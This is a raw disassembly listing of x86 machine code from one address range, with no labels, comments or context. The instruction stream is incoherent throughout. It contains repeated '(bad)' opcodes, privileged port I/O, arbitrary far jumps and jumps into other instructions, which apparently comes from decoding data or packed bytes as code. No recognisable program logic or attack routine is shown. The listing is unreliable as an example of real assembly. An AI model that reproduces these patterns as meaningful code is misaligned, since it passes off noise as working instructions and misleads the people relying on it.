  41525d:	enter  0x516a,0xb3
  415261:	cmp    BYTE PTR [esi+edx*4],0x1e
  415265:	hlt    
  415266:	mov    ds:0x989113ed,eax
  41526b:	aas    
  41526c:	cdq    
  41526d:	inc    esp
  41526e:	test   BYTE PTR [eax-0x45c2dd0c],ch
  415274:	push   es
  415275:	aad    0xf2
  415277:	clc    
  415278:	cmc    
  415279:	inc    ebx
  41527a:	push   ecx
  41527b:	push   esp
  41527c:	sahf   
  41527d:	fisttp WORD PTR [ebx-0x6e3db898]
  415283:	rol    DWORD PTR [edi],cl
  415285:	xchg   edx,eax
  415286:	xor    al,0x96
  415288:	mov    ecx,0xbbe4ec92
  41528d:	ds scas eax,DWORD PTR es:[edi]
  41528f:	mov    bl,0xb2
  415291:	leave  
  415292:	mov    edx,0x3eb8ce02
  415297:	push   ebx
  415298:	push   ebp
  415299:	pop    edx
  41529a:	aam    0xdf
  41529c:	int    0xb1
  41529e:	pop    ebx
  41529f:	in     al,dx
  4152a0:	rcr    DWORD PTR [esi+0x2247853d],cl
  4152a6:	ins    DWORD PTR es:[edi],dx
  4152a7:	add    cl,ah
  4152a9:	jg     0x415308
  4152ab:	(bad)  
  4152ac:	push   esp
  4152ad:	int3   
  4152ae:	push   es
  4152af:	push   esp
  4152b0:	js     0x4152af
  4152b2:	xchg   ebx,eax
  4152b3:	sbb    esi,DWORD PTR [esi-0x500bf1c3]
  4152b9:	int3   
  4152ba:	mov    al,0x61
  4152bc:	xor    edx,esi
  4152be:	cs jecxz 0x41530c
  4152c1:	or     BYTE PTR [ecx-0x4e2d878c],dl
  4152c7:	jg     0x41528b
  4152c9:	jmp    0x4152c2
  4152cb:	jno    0x4152f4
  4152cd:	jp     0x415303
  4152cf:	mov    ds:0x4e700f47,eax
  4152d4:	xchg   edi,eax
  4152d5:	imul   edi,DWORD PTR [ebx+0xf58ee81],0xce23fc2f
  4152df:	dec    edi
  4152e0:	and    DWORD PTR [ecx],esp
  4152e2:	xchg   dh,al
  4152e4:	jg     0x4152f3
  4152e6:	loop   0x4152ee
  4152e8:	shr    BYTE PTR [edi-0x243a6770],0x58
  4152ef:	daa    
  4152f0:	ret    
  4152f1:	xchg   ebx,eax
  4152f2:	inc    edi
  4152f3:	enter  0x82d5,0x76
  4152f7:	ror    DWORD PTR [esp+ebx*1],0x36
  4152fb:	ds jp  0x4152db
  4152fe:	lods   al,BYTE PTR ds:[esi]
  4152ff:	jns    0x4152ba
  415301:	push   cs
  415302:	fwait
  415303:	dec    eax
  415304:	aaa    
  415305:	out    dx,eax
  415306:	pop    ss
  415307:	repnz pop ebp
  415309:	aas    
  41530a:	jns    0x41533d
  41530c:	add    ecx,esi
  41530e:	out    dx,eax
  41530f:	xor    BYTE PTR [edi+0x5b],al
  415312:	xor    BYTE PTR [edx+ebx*8+0x55],ch
  415316:	je     0x41538d
  415318:	push   0xe21b5a02
  41531d:	mov    ch,dh
  41531f:	mov    ah,0x6f
  415321:	pushf  
  415322:	stos   DWORD PTR es:[edi],eax
  415323:	enter  0xc980,0x97
  415327:	xor    eax,0x66db41ce
  41532c:	cmp    eax,0x4f943afe
  415331:	test   BYTE PTR [edi+0x10],dl
  415334:	popa   
  415335:	pop    esp
  415336:	jg     0x4153b4
  415338:	inc    esi
  415339:	cdq    
  41533a:	dec    ebp
  41533b:	stos   BYTE PTR es:[edi],al
  41533c:	sub    BYTE PTR [eax],ah
  41533e:	aaa    
  41533f:	js     0x4152f4
  415341:	xchg   BYTE PTR [edi],dh
  415343:	push   ecx
  415344:	push   ebx
  415345:	nop
  415346:	cdq    
  415347:	les    esi,FWORD PTR [esi+ebx*1+0x29dc12e9]
  41534e:	lods   eax,DWORD PTR ds:[esi]
  41534f:	sbb    eax,0xf5d293c4
  415354:	retf   0xb395
  415357:	adc    al,0x60
  415359:	or     eax,0x7fff33e0
  41535e:	fstp   QWORD PTR [edi-0x2c]
  415361:	ret    0xdca3
  415364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415365:	test   eax,0x2cbb6078
  41536a:	xchg   esp,eax
  41536b:	into   
  41536c:	lods   al,BYTE PTR ds:[esi]
  41536d:	sbb    eax,DWORD PTR [edi+0x43]
  415370:	aam    0xe6
  415372:	mov    edi,0x4b648e5c
  415377:	ss jl  0xbf9e1e96
  41537e:	cmp    DWORD PTR [edx],ebp
  415380:	mov    bh,bl
  415382:	psubq  mm0,QWORD PTR [edx-0x2209683]
  415389:	lock mov DWORD PTR ds:0x6d94ac56,ebx
  415390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415391:	push   ebx
  415392:	sub    BYTE PTR [edx-0x50],bh
  415395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415396:	or     al,0xad
  415398:	rcr    BYTE PTR [edi-0x5b],cl
  41539b:	lods   eax,DWORD PTR ds:[esi]
  41539c:	mov    WORD PTR [eax+0x3b7f3f90],?
  4153a2:	dec    esi
  4153a3:	(bad)  
  4153a4:	cmp    ebp,DWORD PTR [ebx]
  4153a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153a7:	add    dl,bl
  4153a9:	and    dl,0xa4
  4153ac:	je     0x41535b
  4153ae:	pushf  
  4153af:	les    edx,FWORD PTR [edi-0x48e46cb2]
  4153b5:	mov    cs,WORD PTR [edx-0x2143dce2]
  4153bb:	aaa    
  4153bc:	add    BYTE PTR [ecx],0x3b
  4153bf:	out    dx,al
  4153c0:	mov    WORD PTR [eax-0x3d],?
  4153c3:	scas   eax,DWORD PTR es:[edi]
  4153c4:	sbb    eax,0xb19f9003
  4153c9:	add    eax,0x61576823
  4153ce:	mov    ch,0x62
  4153d0:	ins    DWORD PTR es:[edi],dx
  4153d1:	pop    esp
  4153d2:	pop    ds
  4153d3:	push   esp
  4153d4:	test   al,0x32
  4153d6:	inc    eax
  4153d7:	pop    ebx
  4153d8:	mov    WORD PTR [eax+ecx*1-0x26],ds
  4153dc:	ja     0x415431
  4153de:	mov    al,cs:0x7dbcef64
  4153e4:	and    BYTE PTR [edi+0x26],ch
  4153e7:	xchg   ebx,eax
  4153e8:	test   ebp,0xa0ae8087
  4153ee:	ret    
  4153ef:	inc    esp
  4153f0:	stos   BYTE PTR es:[edi],al
  4153f1:	sub    DWORD PTR [ebp+0x75],ebp
  4153f4:	das    
  4153f5:	arpl   WORD PTR [eax-0xe],sp
  4153f8:	popf   
  4153f9:	push   esi
  4153fa:	inc    edi
  4153fb:	dec    ebp
  4153fc:	and    al,BYTE PTR [esi-0x1f]
  4153ff:	push   esi
  415400:	outs   dx,BYTE PTR ds:[esi]
  415401:	cmp    eax,0xb352f64e
  415406:	mov    dh,0x72
  415408:	sub    eax,0x256d9d79
  41540d:	sub    al,0x99
  41540f:	out    dx,al
  415410:	js     0x415441
  415412:	jae    0x415399
  415414:	pop    edi
  415415:	jmp    FWORD PTR [ecx+0x0]
  415418:	jo     0x4153a0
  41541a:	shl    edx,cl
  41541c:	mov    ch,0x10
  41541e:	ins    BYTE PTR es:[edi],dx
  41541f:	lods   eax,DWORD PTR ds:[esi]
  415420:	div    eax
  415422:	pusha  
  415423:	ffreep st(1)
  415425:	jae    0x415402
  415427:	sub    bh,BYTE PTR [ebx+0x53c88ff1]
  41542d:	sbb    eax,0x14de08eb
  415432:	push   esp
  415433:	or     ah,al
  415435:	lock cs push 0xeb90d24f
  41543c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41543d:	mov    WORD PTR [ebx],ds
  41543f:	and    al,0x9b
  415441:	jb     0x4153f3
  415443:	xchg   ecx,eax
  415444:	or     bl,bh
  415446:	mov    eax,0xe19573e0
  41544b:	or     BYTE PTR [edx-0x58],cl
  41544e:	in     eax,0x7f
  415450:	lock in eax,0x35
  415453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415454:	sbb    edx,0xac5f0bfd
  41545a:	dec    ebp
  41545b:	in     al,dx
  41545c:	pop    es
  41545d:	dec    DWORD PTR ds:0x1f3a75b9
  415463:	xchg   ah,ah
  415465:	aam    0x9
  415467:	test   al,0xfc
  415469:	push   ebp
  41546a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41546b:	ficom  WORD PTR [ebp-0x1b]
  41546e:	outs   dx,BYTE PTR ds:[esi]
  41546f:	or     eax,ebp
  415471:	cmp    ecx,DWORD PTR [edi-0x64]
  415474:	fs sub eax,0xfb182bc6
  41547a:	int3   
  41547b:	push   ds
  41547c:	mov    ch,BYTE PTR [ebx-0x34eb478d]
  415482:	sub    eax,DWORD PTR ds:0x3827df1c
  415488:	pop    esi
  415489:	inc    esi
  41548a:	sbb    edx,DWORD PTR [edx]
  41548c:	push   esi
  41548d:	repnz retf 
  41548f:	std    
  415490:	addr16 ss dec ebx
  415493:	pop    ss
  415494:	sub    al,0x8
  415496:	popa   
  415497:	sbb    al,BYTE PTR [edx+0x2c]
  41549a:	sti    
  41549b:	outs   dx,BYTE PTR ds:[esi]
  41549c:	mov    al,ds:0x78118a9d
  4154a1:	pop    esp
  4154a2:	or     eax,0x1d67a5d8
  4154a7:	adc    dl,bh
  4154a9:	pusha  
  4154aa:	enter  0xf1e2,0xf8
  4154ae:	mov    ecx,DWORD PTR [esi+ebp*1+0x1ba98212]
  4154b5:	pop    esp
  4154b6:	sub    DWORD PTR [ebx-0x4b],ebp
  4154b9:	out    dx,al
  4154ba:	and    BYTE PTR [ecx+0x2c8a2cfd],cl
  4154c0:	cdq    
  4154c1:	xor    dl,ch
  4154c3:	adc    eax,0xb430789b
  4154c8:	push   esi
  4154c9:	lahf   
  4154ca:	mov    ss,ebp
  4154cc:	jmp    DWORD PTR [edx-0x7064f88c]
  4154d2:	mov    bl,0xd3
  4154d4:	jmp    0xef5b:0x206864d2
  4154db:	jg     0x4154b3
  4154dd:	pop    esi
  4154de:	dec    eax
  4154df:	inc    eax
  4154e0:	dec    edi
  4154e1:	mov    edx,0x3e81e1c8
  4154e6:	pop    edi
  4154e7:	inc    ebp
  4154e8:	cvtdq2ps xmm6,XMMWORD PTR [ecx-0x7e774421]
  4154ef:	cwde   
  4154f0:	imul   ecx,DWORD PTR [eax+0xb91f1d7],0xa4549175
  4154fa:	pop    ss
  4154fb:	xchg   esp,eax
  4154fc:	loope  0x4154dc
  4154fe:	mov    BYTE PTR [edi-0x42],ch
  415501:	leave  
  415502:	sbb    DWORD PTR [eax],eax
  415504:	(bad)  
  415505:	shl    DWORD PTR [ebx+0x69],1
  415508:	adc    ebx,edx
  41550a:	xor    DWORD PTR [edx-0x22],edx
  41550d:	rcr    DWORD PTR [esi+0x4a],1
  415510:	jecxz  0x415509
  415512:	dec    edx
  415513:	pop    esp
  415514:	mov    eax,0x54d594b6
  415519:	or     eax,0xdbd8a502
  41551e:	adc    al,0x89
  415520:	mov    edx,DWORD PTR [ecx+0xc]
  415523:	jge    0x415578
  415525:	push   ebx
  415526:	lock enter 0xaab9,0xdb
  41552b:	push   ecx
  41552c:	fcmovb st,st(4)
  41552e:	aad    0xdd
  415530:	je     0x41552c
  415532:	call   0x93a2811
  415537:	jmp    0x889e:0xdcab2135
  41553e:	cmp    edi,ecx
  415540:	mov    ah,0x62
  415542:	xchg   edx,eax
  415543:	dec    ebp
  415544:	pop    ss
  415545:	xor    DWORD PTR [edx],esp
  415547:	jnp    0x415522
  415549:	mov    al,0x80
  41554b:	xor    BYTE PTR [ebp+0x72],bh
  41554e:	jecxz  0x415553
  415550:	cmc    
  415551:	(bad)  
  415552:	jge    0x415511
  415554:	scas   al,BYTE PTR es:[edi]
  415555:	cmp    eax,0x5dccb52d
  41555a:	test   DWORD PTR [ebx-0x5f],ebp
  41555d:	dec    ecx
  41555e:	sub    DWORD PTR [esp+ebp*4+0x35],ebp
  415562:	xchg   esi,eax
  415563:	mov    ebx,0xcc688ec6
  415568:	sahf   
  415569:	adc    edi,edx
  41556b:	sub    eax,0x85d34058
  415570:	sub    eax,0x707d38f8
  415575:	bound  eax,QWORD PTR [esi]
  415577:	inc    ebp
  415578:	jge    0x415598
  41557a:	lods   al,BYTE PTR ds:[esi]
  41557b:	adc    edi,DWORD PTR [ecx+0x24]
  41557e:	test   BYTE PTR [edi-0x6b2c95e9],0x4d
  415585:	int3   
  415586:	stc    
  415587:	cmc    
  415588:	mov    eax,ds:0x8fadc063
  41558d:	sbb    eax,0x72ca7353
  415592:	call   0xab89:0x2bbb8823
  415599:	lea    ebp,fs:[edx]
  41559c:	push   ebp
  41559d:	xchg   esi,esp
  41559f:	in     al,dx
  4155a0:	pop    esp
  4155a1:	jmp    0x8ce6:0xb9420eb3
  4155a8:	adc    eax,0x8b6df7db
  4155ad:	int3   
  4155ae:	and    eax,0xfa9a5496
  4155b3:	test   ah,ch
  4155b5:	cli    
  4155b6:	hlt    
  4155b7:	shr    BYTE PTR [edx],0x81
  4155ba:	jb     0x415609
  4155bc:	pushf  
  4155bd:	fistp  DWORD PTR [ecx]
  4155bf:	jbe    0x4155e9
  4155c1:	xchg   DWORD PTR [edi],esi
  4155c3:	jl     0x415554
  4155c5:	sbb    ecx,DWORD PTR ds:0x38e6183a
  4155cb:	into   
  4155cc:	or     esi,DWORD PTR [ebx]
  4155ce:	xor    BYTE PTR [ebx],ch
  4155d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155d1:	leave  
  4155d2:	jno    0x415645
  4155d4:	outs   dx,DWORD PTR ds:[esi]
  4155d5:	cmp    ch,ah
  4155d7:	or     al,al
  4155d9:	fistp  QWORD PTR [esi-0x453b2c35]
  4155df:	fld    TBYTE PTR [esp+ecx*4+0x13d37a89]
  4155e6:	inc    ecx
  4155e7:	jnp    0x415607
  4155e9:	jnp    0x415576
  4155eb:	cmp    DWORD PTR [ecx-0x16de8c1a],esi
  4155f1:	mov    ebx,0x177b6f6f
  4155f6:	pop    ss
  4155f7:	jg     0x415647
  4155f9:	xchg   edi,eax
  4155fa:	les    esi,FWORD PTR [esi]
  4155fc:	(bad)  
  4155fd:	in     al,dx
  4155fe:	ror    DWORD PTR [ebx-0x5586a1e7],1
  415604:	pop    esp
  415605:	cmp    eax,0xd3d5aeb0
  41560a:	dec    ebp
  41560b:	push   ebp
  41560c:	mov    ecx,0xfeb1ecc2
  415611:	pop    edx
  415612:	and    ah,BYTE PTR [edi+eax*2-0x43d8ff33]
  415619:	mov    ch,0x4b
  41561b:	jmp    0x1d26:0x5e976125
  415622:	push   ebx
  415623:	add    al,0x99
  415625:	out    0xf9,al
  415627:	call   0x73d7c73
  41562c:	dec    esp
  41562d:	es mov edx,0x8ef6eca5
  415633:	jb     0x41568f
  415635:	aad    0xd6
  415637:	ds dec esp
  415639:	out    0x9b,eax
  41563b:	ja     0x415680
  41563d:	xor    al,0xff
  41563f:	(bad)  
  415640:	xchg   esp,eax
  415641:	and    ecx,esi
  415643:	inc    ebp
  415644:	adc    al,ah
  415646:	test   eax,0x8b7a8a1
  41564b:	shl    DWORD PTR [edx+0x6c745af9],cl
  415651:	xchg   BYTE PTR [eax],dh
  415653:	xchg   esi,eax
  415654:	call   0x4843:0xda603f53
  41565b:	add    BYTE PTR [ebp-0x3a],ch
  41565e:	cmp    eax,0x4e530306
  415663:	pushf  
  415664:	jge    0x4156bf
  415666:	cmp    ah,BYTE PTR ds:0xcc6ffd32
  41566c:	rol    dl,cl
  41566e:	retf   0x40d
  415671:	mov    ds:0x244d4f0d,eax
  415676:	ret    0x87f0
  415679:	loop   0x4156b8
  41567b:	inc    ebx
  41567c:	aaa    
  41567d:	fisttp DWORD PTR [ebx]
  41567f:	cmp    esp,DWORD PTR [esi]
  415681:	xchg   esi,eax
  415682:	inc    edi
  415683:	xor    DWORD PTR [esi-0x66498a1f],eax
  415689:	rcr    BYTE PTR [ebx+edx*8+0x6d],cl
  41568d:	lods   eax,DWORD PTR ds:[esi]
  41568e:	fsub   QWORD PTR [ebx]
  415690:	idiv   ah
  415692:	shl    BYTE PTR [ebx-0x1a3156f7],0xa6
  415699:	(bad)  
  41569a:	aas    
  41569b:	jecxz  0x4156ef
  41569d:	jl     0x41571b
  41569f:	xchg   ebp,eax
  4156a0:	test   al,0x47
  4156a2:	mov    ecx,0x4a571745
  4156a7:	sbb    ebx,DWORD PTR [edx+eax*1+0x846d2c]
  4156ae:	iret   
  4156af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b0:	and    al,0xee
  4156b2:	adc    eax,DWORD PTR [ebx+esi*4+0x77]
  4156b6:	push   ebp
  4156b7:	sbb    eax,0x74640095
  4156bc:	enter  0x1566,0xdf
  4156c0:	pop    ds
  4156c1:	inc    ebx
  4156c2:	push   edx
  4156c3:	nop
  4156c4:	pop    edi
  4156c5:	je     0x4156ea
  4156c7:	sub    bh,BYTE PTR [edi-0x2e]
  4156ca:	test   al,0x31
  4156cc:	cld    
  4156cd:	mov    DWORD PTR [edi],ebp
  4156cf:	mov    esp,0xc73ca96a
  4156d4:	add    DWORD PTR ds:0xbca17ab9,ebp
  4156da:	mov    ds:0x9b0dd852,eax
  4156df:	pusha  
  4156e0:	xchg   ebx,eax
  4156e1:	iret   
  4156e2:	mov    esi,0x46ed52e8
  4156e7:	sbb    ecx,ebx
  4156e9:	xchg   BYTE PTR [eax],bl
  4156eb:	test   DWORD PTR [edi+0xe2f9089],0xa3f04e16
  4156f5:	jne    0x4156d9
  4156f7:	dec    ecx
  4156f8:	imul   edi,DWORD PTR [ebx+0x337edac1],0x32
  4156ff:	jo     0x41569e
  415701:	cld    
  415702:	iret   
  415703:	stc    
  415704:	nop
  415705:	cmp    eax,0x96642207
  41570a:	mov    eax,DWORD PTR [ebp+0x7cf92075]
  415710:	sbb    esp,ebx
  415712:	mov    ds:0xe0287610,eax
  415717:	cmp    eax,DWORD PTR ds:0xcefd6f01
  41571d:	bound  edx,QWORD PTR [esi]
  41571f:	sahf   
  415720:	mov    ds:0xb9dbfdd1,eax
  415725:	fstp   DWORD PTR [ebp-0xacbf539]
  41572b:	cdq    
  41572c:	cs xchg esp,eax
  41572e:	xchg   DWORD PTR [esi+0x399857a1],edx
  415734:	mov    ds:0xf7475a6a,eax
  415739:	into   
  41573a:	inc    esi
  41573b:	(bad)  
  41573c:	out    0x41,al
  41573e:	push   ss
  41573f:	imul   eax,DWORD PTR [edi],0x30
  415742:	lds    esp,FWORD PTR [edx-0x5db91ea1]
  415748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415749:	test   al,0xae
  41574b:	lahf   
  41574c:	les    eax,FWORD PTR ds:0x2033f12f
  415752:	jg     0x4156f0
  415754:	inc    edi
  415755:	push   ebx
  415756:	push   ebp
  415757:	push   eax
  415758:	test   al,0x1a
  41575a:	sar    BYTE PTR [edi-0x5c],1
  41575d:	sbb    eax,0xac93333a
  415762:	xchg   esp,eax
  415763:	push   edi
  415764:	jmp    0xc3a1:0xe5248e4c
  41576b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41576c:	lds    ebp,FWORD PTR [ebp-0x25dbe632]
  415772:	add    ch,BYTE PTR [eax-0x452000c]
  415778:	xor    al,0xc5
  41577a:	xlat   BYTE PTR ds:[ebx]
  41577b:	ret    0xbb5e
  41577e:	mov    eax,eax
  415780:	and    eax,0xdc9ec18b
  415785:	stos   DWORD PTR es:[edi],eax
  415786:	(bad)  
  415787:	dec    ecx
  415789:	xchg   ecx,eax
  41578a:	push   0xb1b9212d
  41578f:	add    ah,ah
  415791:	sub    al,0xfc
  415793:	sub    ebx,edx
  415795:	xor    BYTE PTR [ebx],ch
  415797:	jne    0x41577d
  415799:	aam    0x8b
  41579b:	cli    
  41579c:	mov    esi,0xcf300ea
  4157a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157a2:	(bad)  
  4157a3:	adc    bl,BYTE PTR [edi]
  4157a5:	call   DWORD PTR [edi+0x6]
  4157a8:	adc    BYTE PTR [esi-0x45],0x40
  4157ac:	fimul  DWORD PTR [esi]
  4157ae:	cmp    dh,BYTE PTR [edi+0x2b]
  4157b1:	fs out dx,al
  4157b3:	test   al,0x53
  4157b5:	adc    dh,BYTE PTR [ecx+0x15fcce97]
  4157bb:	push   0xfc2afcfe
  4157c0:	xor    ebp,0xffffffa9
  4157c3:	or     al,0x75
  4157c5:	jg     0x415842
  4157c7:	inc    eax
  4157c8:	sub    edx,ebp
  4157ca:	ins    BYTE PTR es:[edi],dx
  4157cb:	inc    ebx
  4157cc:	mov    ah,0x81
  4157ce:	(bad)  
  4157cf:	hlt    
  4157d0:	nop
  4157d1:	pop    edi
  4157d2:	punpcklwd mm2,DWORD PTR [edi+0x79]
  4157d6:	(bad)  
  4157d7:	cmp    BYTE PTR [edi+0x17],ch
  4157da:	loopne 0x415810
  4157dc:	sbb    eax,0x65e77347
  4157e1:	ss jno 0x415782
  4157e4:	mov    al,ds:0xc1cd9858
  4157e9:	or     edx,DWORD PTR [edx-0x52]
  4157ec:	(bad)  
  4157ed:	stos   BYTE PTR es:[edi],al
  4157ee:	mov    esp,0x40e3ad59
  4157f3:	nop
  4157f4:	push   cx
  4157f6:	enter  0x3ffb,0xf2
  4157fa:	movntps XMMWORD PTR [ecx+0x26045a4],xmm1
  415801:	add    eax,0xde94769f
  415806:	ins    BYTE PTR es:[edi],dx
  415807:	mov    dl,0xcc
  415809:	int3   
  41580a:	pop    ebp
  41580b:	pop    ds
  41580c:	lods   al,BYTE PTR ds:[esi]
  41580d:	hlt    
  41580e:	dec    ecx
  41580f:	mov    BYTE PTR [ecx-0x52],bl
  415812:	and    BYTE PTR [ebx+0x6d339ff9],0xd2
  415819:	push   ss
  41581a:	push   ss
  41581b:	popf   
  41581c:	enter  0x1781,0xce
  415820:	push   ss
  415821:	and    DWORD PTR [esi-0x2d32e4ed],ebp
  415827:	enter  0x3462,0xb1
  41582b:	retf   
  41582c:	cmp    ecx,esi
  41582e:	pop    esp
  41582f:	cmp    eax,0xc552b0df
  415834:	mov    ds:0x903165ab,eax
  415839:	rol    DWORD PTR [edi-0x52],0xd0
  41583d:	aam    0x3e
  41583f:	fwait
  415840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415841:	jb     0x4157e4
  415843:	mov    esp,0xcfee601c
  415848:	cmp    eax,0x1f022903
  41584d:	and    ecx,esp
  41584f:	int    0x63
  415851:	inc    esi
  415852:	sbb    BYTE PTR [ecx+eax*4+0x67471ecb],ah
  415859:	pop    ebp
  41585a:	in     al,dx
  41585b:	adc    BYTE PTR [ebx],dl
  41585d:	xlat   BYTE PTR ds:[ebx]
  41585e:	in     al,dx
  41585f:	xor    al,0x3f
  415861:	ret    0x781f
  415864:	mov    ah,0x32
  415866:	loope  0x415884
  415868:	and    al,0xd5
  41586a:	jg     0x415834
  41586c:	push   edi
  41586d:	fadd   DWORD PTR [ebp+0x123ec8a]
  415873:	adc    esi,edi
  415875:	add    ecx,DWORD PTR [ecx]
  415877:	xchg   edx,eax
  415878:	mov    ds:0x9db2f6c6,al
  41587d:	jo     0x415830
  41587f:	adc    DWORD PTR [edx*4-0x18e24f55],edi
  415886:	neg    esp
  415888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415889:	jmp    0x4158d8
  41588b:	jo     0x4158a8
  41588d:	cmp    eax,0x5f75ac61
  415892:	popf   
  415893:	outs   dx,DWORD PTR ds:[esi]
  415894:	call   DWORD PTR [ecx]
  415896:	data16 adc al,0xed
  415899:	(bad)  
  41589a:	lahf   
  41589b:	inc    eax
  41589c:	shl    BYTE PTR ds:0xee45ea9a,0x48
  4158a3:	xor    eax,0x1b94e1e
  4158a8:	push   cs
  4158a9:	or     BYTE PTR [eax-0x4b01cb58],dl
  4158af:	push   0xffffffa1
  4158b1:	push   cs
  4158b2:	aad    0x35
  4158b4:	mov    ecx,0x1453dcbd
  4158b9:	dec    ecx
  4158ba:	cdq    
  4158bb:	cmp    BYTE PTR [esi],bl
  4158bd:	hlt    
  4158be:	sbb    al,0x2a
  4158c0:	stos   DWORD PTR es:[edi],eax
  4158c1:	jbe    0x41588b
  4158c3:	or     BYTE PTR [eax],0xf5
  4158c6:	outs   dx,BYTE PTR ds:[esi]
  4158c7:	mov    gs:0x4e0a0dda,eax
  4158cd:	sbb    eax,0xe2317013
  4158d2:	fistp  DWORD PTR [ecx]
  4158d4:	xor    eax,0xb8334d2f
  4158d9:	fcomp  DWORD PTR [ebp+0x14]
  4158dc:	cmc    
  4158dd:	jns    0x41586a
  4158df:	out    0xb,eax
  4158e1:	or     al,dl
  4158e3:	fwait
  4158e4:	add    al,0xc7
  4158e6:	repnz cmp bh,BYTE PTR [ecx]
  4158e9:	jg     0x415892
  4158eb:	xchg   ecx,eax
  4158ec:	pop    edi
  4158ed:	lea    esp,[ebp-0x21]
  4158f0:	push   ecx
  4158f1:	and    DWORD PTR [ecx],0xfffffff5
  4158f4:	vmovsd QWORD PTR [ecx+eax*4],xmm0
  4158f9:	mov    bl,0x38
  4158fb:	cmp    eax,0xa82287d1
  415900:	sbb    bl,BYTE PTR [esi]
  415902:	(bad)  
  415903:	or     BYTE PTR [edi-0x2b],bl
  415906:	and    DWORD PTR [edx+0x14],esi
  415909:	and    eax,0x1d91e5ad
  41590e:	(bad)
  415911:	jp     0x41592f
  415913:	js     0x41595a
  415915:	mov    bh,0xe4
  415917:	in     al,0x99
  415919:	cmp    DWORD PTR ds:[edi-0x4534bddb],edi
  415920:	mov    dh,0x5c
  415922:	mov    eax,0x1e533a1c
  415927:	scas   eax,DWORD PTR es:[edi]
  415928:	lds    eax,FWORD PTR [edx]
  41592a:	test   al,0x71
  41592c:	sbb    al,0xe3
  41592e:	out    dx,eax
  41592f:	dec    edi
  415930:	xlat   BYTE PTR ds:[ebx]
  415931:	jo     0x4158cc
  415933:	jo     0x415918
  415935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415936:	push   ebx
  415937:	lods   eax,DWORD PTR ds:[esi]
  415938:	imul   edi,DWORD PTR [edx+0x2d],0xffffffa3
  41593c:	sub    eax,0x41c16df8
  415941:	push   edi
  415942:	pop    ecx
  415943:	in     eax,0x49
  415945:	mov    ebp,0xaa2ca213
  41594a:	dec    ebx
  41594b:	loope  0x4158e4
  41594d:	test   DWORD PTR [esi],ebp
  41594f:	jo     0x415928
  415951:	clc    
  415952:	sub    DWORD PTR [ecx+0x26],ecx
  415955:	mov    ecx,0x2721dcb6
  41595a:	pop    ecx
  41595b:	jecxz  0x4159a8
  41595d:	outs   dx,DWORD PTR ds:[esi]
  41595e:	mov    eax,ds:0x38bf9f32
  415963:	stc    
  415964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415965:	xchg   esi,eax
  415966:	fdiv   QWORD PTR [edi-0x303d8fb]
  41596c:	pop    ds
  41596d:	(bad)  
  41596f:	pop    ss
  415970:	mov    bl,0x66
  415972:	xor    dl,BYTE PTR [edx-0x46]
  415975:	enter  0x2c30,0xed
  415979:	jmp    0x415936
  41597b:	dec    ebx
  41597c:	in     eax,0x7f
  41597e:	xor    esi,0x41326a7c
  415984:	ret    0xa194
  415987:	pop    edx
  415988:	xor    ah,bh
  41598a:	pop    edx
  41598b:	enter  0x4dcb,0x2
  41598f:	or     bl,BYTE PTR [ebp+esi*4-0x56]
  415993:	jmp    0xdded:0x79ed9160
  41599a:	add    al,0x12
  41599c:	inc    ebp
  41599d:	retf   0xd7c2
  4159a0:	test   DWORD PTR [edx-0x7],edi
  4159a3:	dec    ecx
  4159a4:	push   edx
  4159a5:	mov    gs,edx
  4159a7:	and    ecx,esp
  4159a9:	push   es
  4159aa:	scas   eax,DWORD PTR es:[edi]
  4159ab:	xchg   BYTE PTR [ebx+ecx*8],cl
  4159ae:	sbb    ecx,edx
  4159b0:	lds    ebx,FWORD PTR [ebp+esi*4-0x5c16f8ee]
  4159b7:	push   ecx
  4159b8:	mov    ?,WORD PTR [edi+0x6d]
  4159bb:	mov    eax,0x7ceec0ad
  4159c0:	stos   BYTE PTR es:[edi],al
  4159c1:	mov    dh,0x3b
  4159c3:	jnp    0x415a15
  4159c5:	jbe    0x4159ea
  4159c7:	jo     0x41598b
  4159c9:	mov    ah,0xee
  4159cb:	xchg   edi,eax
  4159cc:	daa    
  4159cd:	jmp    0xeadf:0x3cb4d4f5
  4159d4:	push   0x1b
  4159d6:	test   al,0xdf
  4159d8:	adc    bh,BYTE PTR [ebp+0x3051fa8d]
  4159de:	outs   dx,DWORD PTR ds:[esi]
  4159df:	je     0x4159c9
  4159e1:	cmp    esi,esi
  4159e3:	(bad)  
  4159e4:	lods   al,BYTE PTR ds:[esi]
  4159e5:	and    al,0xa9
  4159e7:	mov    bl,0x3b
  4159e9:	cmp    eax,DWORD PTR [ebp+0x1c12921a]
  4159ef:	cs or  ebp,edx
  4159f2:	int    0x2d
  4159f4:	sti    
  4159f5:	ret    
  4159f6:	and    al,0x2a
  4159f8:	bound  ebp,QWORD PTR [eax]
  4159fa:	or     BYTE PTR [eax-0x79],al
  4159fd:	shr    bl,cl
  4159ff:	add    eax,0xc2496ca8
  415a04:	fistp  DWORD PTR [eax+ebp*1]
  415a07:	cs adc eax,0x9a2bfffd
  415a0d:	jecxz  0x415a60
  415a0f:	adc    eax,0x6b22e546
  415a14:	jecxz  0x415a30
  415a16:	inc    ecx
  415a17:	push   0xffffff85
  415a19:	mov    dl,0xb3
  415a1b:	inc    eax
  415a1c:	push   edi
  415a1d:	test   DWORD PTR [edi+0x7f],ecx
  415a20:	jmp    0x2ccd1c08
  415a25:	ins    BYTE PTR es:[edi],dx
  415a26:	repz mov edi,0x150d0645
  415a2c:	jae    0x4159fb
  415a2e:	push   ebx
  415a2f:	mov    esi,0xa7a6ef27
